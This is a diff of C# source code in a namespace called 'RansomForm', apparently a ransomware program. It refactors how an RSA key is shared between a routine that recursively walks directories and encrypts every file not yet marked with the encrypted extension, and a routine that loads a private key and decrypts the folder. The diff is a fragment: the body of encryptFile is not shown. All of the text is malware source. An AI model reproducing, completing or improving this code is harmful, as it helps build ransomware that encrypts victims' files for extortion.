@@ -53,7 +53,7 @@ namespace RansomForm
         if (!f.Contains(ENCRYPTED_FILE_EXTENSION))
         {
           Console.Out.WriteLine("Encrypting: " + f);
-          encryptFile(f, RSA);
+          encryptFile(f);
         }
       }
       foreach (string f in Directory.GetDirectories(path))
@@ -62,7 +62,7 @@ namespace RansomForm
       }
     }
 
-    void encryptFile(string path, RSACryptoServiceProvider RSA)
+    void encryptFile(string path)
     {
       try
       {
@@ -135,16 +135,15 @@ namespace RansomForm
         privateKey = new byte[fileStream.Length];
         fileStream.Read(privateKey, 0, privateKey.Length);
       }
+      RSA = new RSACryptoServiceProvider(2048);
+      int bytesRead;
+      RSA.ImportPkcs8PrivateKey(privateKey, out bytesRead);
       decryptFolder(folderpath);
       this.Close();
     }
 
     void decryptFolder(string path)
     {
-      RSACryptoServiceProvider RSA = new RSACryptoServiceProvider(2048);
-      int bytesRead;
-      RSA.ImportPkcs8PrivateKey(privateKey, out bytesRead);
-
       foreach (string f in Directory.GetFiles(path))
       {
         if (f.Contains(ENCRYPTED_FILE_EXTENSION))
